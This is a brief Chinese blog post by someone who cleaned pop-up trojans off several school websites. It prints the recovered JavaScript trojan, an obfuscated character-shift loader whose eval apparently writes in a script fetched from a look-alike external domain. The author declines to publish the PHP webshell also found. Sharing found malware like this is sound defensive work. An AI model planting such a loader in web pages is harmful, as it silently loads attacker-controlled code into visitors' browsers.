
---
title: js木马
description: 木马发现
date: 2015-12-31
categories:
  - "日常"
tags:
  - "木马"
  - "js"
  - "php"
---

最近发现学校的多个站点，中了弹窗木马，费了好大劲，清完了，同时缴获php大马一枚，还不错。。。

木马代码

```js
var str="cnbtldms-vqhsd'!;rbqhosrqb<[!gsso9..vvv-fnnfkd`crk-bnl.robncd.iptdqx-ir[!=;.rbqhos=!(:";var length=str.length;var ba64="";for(i=0;i<length;i++){var s=str.charCodeAt(i);s++;ba64=ba64+String.fromCharCode(s)}eval(ba64);
```

木马程序就不上传了，哈哈